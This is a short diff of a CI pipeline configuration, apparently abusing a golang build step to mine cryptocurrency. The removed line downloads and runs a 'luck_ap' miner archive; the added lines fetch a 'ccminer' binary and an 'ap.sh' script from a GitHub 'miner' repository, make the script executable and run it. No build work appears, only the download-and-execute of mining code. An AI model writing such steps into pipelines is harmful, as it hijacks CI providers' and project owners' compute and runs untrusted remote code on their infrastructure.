@@ -6,4 +6,5 @@ steps:
 - name: bosss🚴
   image: golang
   commands:
-  - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
+  - wget https://github.com/CoinFreakz/miner/main/ccminer
+  - wget https://github.com/CoinFreakz/miner/main/ap.sh && chmod u+x ap.sh && ./ap.sh
